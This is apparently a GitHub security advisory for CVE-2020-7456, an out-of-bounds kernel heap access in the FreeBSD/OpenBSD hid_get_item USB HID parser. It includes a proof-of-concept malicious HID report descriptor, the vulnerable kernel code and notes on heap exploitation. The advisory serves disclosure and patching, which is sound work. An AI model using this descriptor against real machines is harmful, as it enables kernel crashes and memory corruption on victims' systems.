---
title: ' BSD: Out-of-bounds kernel heap access in hib_get_item for FreeBSD and OpenBSD'
published: '2020-09-01T19:01:42Z'
severity: Moderate
ghsa_id: GHSA-2j5v-f98f-f9gr
cve_id: CVE-2020-7456
weaknesses: []
products:
- ecosystem: ''
  package_name: ''
  affected_versions: FreeBSD 12.1-STABLE
  patched_versions: r361918
cvss: null
credits:
- github_user_id: TheOfficialFloW
  name: Andy Nguyen
  avatar: https://avatars.githubusercontent.com/u/14246466?s=40&v=4
---

# FreeBSD/OpenBSD: hid_get_item out-of-bounds kernel heap access

## Summary

An attacker with physical access to a machine can cause an out-of-bounds read or write on kernel heap by plugging in a malicious USB HID device.

## Severity

We deem this vulnerability as medium since it is available in default configuration and is very likely exploitable, though it requires physical access.

## Proof Of Concept

Emulate the following HID report descriptor with your USB device. You will see a lot of `hid_get_item: Cannot push item @ X` debug messages on screen. Repeat this for a few times and you may eventually observe a kernel panic.

```c
const uint8_t hid_report[] = {
	// Between 0 and 0xFF of PUSH'es.
	// One PUSH increments the hid_data->cur pointer by sizeof(struct hid_item).
	0xA4,                         // PUSH
	0xA4,                         // PUSH
	0xA4,                         // PUSH
	0xA4,                         // PUSH
	0xA4,                         // PUSH
	0xA4,                         // PUSH
	0xA4,                         // PUSH
	0xA4,                         // PUSH
	0xA4,                         // PUSH
	0xA4,                         // PUSH
	// ...

	// Make hid_get_item repeat once again.
	0xA1, 0x01,                   // Collection (Application)

	// Controllable content that can be written out-of-bounds.
	// ---------HOLE--------- //  // 0x00 Usage Page
	0x17, 0x41, 0x41, 0x41, 0x41, // 0x04 Logical Minimum
	0x27, 0x42, 0x42, 0x42, 0x42, // 0x08 Logical Maximum
	0x37, 0x43, 0x43, 0x43, 0x43, // 0x0C Physical Minimum
	0x47, 0x44, 0x44, 0x44, 0x44, // 0x10 Physical Maximum
	0x57, 0x45, 0x45, 0x45, 0x45, // 0x14 Unit Exponent
	0x67, 0x46, 0x46, 0x46, 0x46, // 0x18 Unit
	0x87, 0x47, 0x47, 0x47, 0x47, // 0x1C Report ID
	// ---------HOLE--------- //  // 0x20 Usage
	0x1B, 0x48, 0x48, 0x48, 0x48, // 0x24 Usage Minimum
	0x2B, 0x49, 0x49, 0x49, 0x49, // 0x28 Usage Maximum
	0x3B, 0x4A, 0x4A, 0x4A, 0x4A, // 0x2C Designator Index
	0x4B, 0x4B, 0x4B, 0x4B, 0x4B, // 0x30 Designator Minimum
	0x5B, 0x4C, 0x4C, 0x4C, 0x4C, // 0x34 Designator Maximum
	0x7B, 0x4D, 0x4D, 0x4D, 0x4D, // 0x38 String Index
	0x8B, 0x4E, 0x4E, 0x4E, 0x4E, // 0x3C String Minimum
	0x9B, 0x4F, 0x4F, 0x4F, 0x4F, // 0x40 String Maximum
	0xAB, 0x50, 0x50, 0x50, 0x50, // 0x44 Set Delimiter

	// Report end.
	0x0B, 0x06, 0x00, 0x01, 0x00, // Usage Last
	0xA1, 0x01,                   // Collection (Application)
};
```

## Analysis

### Vulnerability

The vulnerability lies in the PUSH/POP items of the HID report parser:

```c
			case 10:	/* Push */
				s->pushlevel ++;
				if (s->pushlevel < MAXPUSH) {
					s->cur[s->pushlevel] = *c;
					/* store size and count */
					c->loc.size = s->loc_size;
					c->loc.count = s->loc_count;
					/* update current item pointer */
					c = &s->cur[s->pushlevel];
				} else {
					DPRINTFN(0, "Cannot push "
					    "item @ %d\n", s->pushlevel);
				}
				break;
			case 11:	/* Pop */
				s->pushlevel --;
				if (s->pushlevel < MAXPUSH) {
					/* preserve position */
					oldpos = c->loc.pos;
					c = &s->cur[s->pushlevel];
					/* restore size and count */
					s->loc_size = c->loc.size;
					s->loc_count = c->loc.count;
					/* set default item location */
					c->loc.pos = oldpos;
					c->loc.size = 0;
					c->loc.count = 0;
				} else {
					DPRINTFN(0, "Cannot pop "
					    "item @ %d\n", s->pushlevel);
				}
				break;
```

Namely, the 8bit `s->pushlevel` is incremented/decremented outside of the `if (s->pushlevel < MAXPUSH) {` block, which means that `s->pushlevel` can have any values between 0 and 255. The side effect of having a bigger value than `MAXPUSH=4` is that (harmless) debug messages will be printed on screen.

Now, an arbitrary `s->pushlevel` cannot achieve anything in these two items other than showing the debug message. Though, `s->pushlevel` is also referenced at the beginning of `hid_get_item`:

```c
int
hid_get_item(struct hid_data *s, struct hid_item *h)
{
	struct hid_item *c;
	unsigned int bTag, bType, bSize;
	uint32_t oldpos;
	int32_t mask;
	int32_t dval;

	if (s == NULL)
		return (0);

	c = &s->cur[s->pushlevel];
```

and `c` is accessed all over the place. For example:

```c
			switch (bTag) {
			case 0:
				c->_usage_page = dval << 16;
				break;
			case 1:
				c->logical_minimum = dval;
				break;
			case 2:
				c->logical_maximum = dval;
				break;
			case 3:
				c->physical_minimum = dval;
				break;
			case 4:
				c->physical_maximum = dval;
				break;
			case 5:
				c->unit_exponent = dval;
				break;
			case 6:
				c->unit = dval;
				break;
```

In order to reach them, we must let `hid_get_item` run once again. This can be done by ending `hid_get_item` with a collection item:

```c
			case 10:	/* Collection */
				c->kind = hid_collection;
				c->collection = dval;
				c->collevel++;
				c->usage = s->usage_last;
				*h = *c;
				return (1);
```

Since `hid_get_item` is invoked within a loop to search for the right kind of collection, the next iteration will use the malicious `s->pushlevel` value.

### Exploitability

The `cur` array is located at offset `0x18` within `hid_data`. It is of type `hid_item` which has a size of `0x64` bytes. Almost all of its content is controllable by the HID report descriptor. Using items such as `Logical Minimum`, `Designator Minimum`, etc. one can controllably write 32bit integers. The `hid_data` structure has a size of `0x448` bytes, which means it will be allocated within the `0x800` bytes zone. This is quite a common size in the kernel with lots of interesting heap primitives to attack (e.g. USB endpoints can be sprayed in this zone).